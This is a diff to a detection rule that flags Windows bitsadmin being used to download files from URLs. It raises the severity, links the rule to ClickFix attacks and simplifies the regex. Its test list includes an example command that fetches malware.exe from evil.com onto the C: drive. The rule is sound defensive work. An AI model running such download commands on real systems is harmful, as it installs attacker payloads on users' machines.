@@ -1,11 +1,12 @@
-name: high-08-bitsadmin
-severity: high
+name: critical-06-bitsadmin
+severity: critical
 description: >
-  Detects bitsadmin downloading files from URLs. Windows background transfer utility abused for payload downloads.
+  Detects bitsadmin downloading files from URLs. Common in ClickFix attacks (35-45% prevalence).
+  Windows background transfer utility abused for payload downloads with persistent download capability.
   Detection includes various flag orderings, spacing variations, and both uppercase and lowercase syntax.
 
 pattern: |
-  (?i)bitsadmin(?:\.exe)?[\s\r\n]+(?:[^\r\n]*?/(?:transfer|download|addfile)[\s\r\n]+[^\r\n]*?(?:http://|https://|ftp://)|/transfer[\s\r\n]+[^\r\n]*?(?:http://|https://|ftp://))
+  (?i)bitsadmin.*/(transfer|download|addfile).*(https?|ftp)://
 
 malicious:
   - "bitsadmin /transfer job http://evil.com/malware.exe C:\\malware.exe"
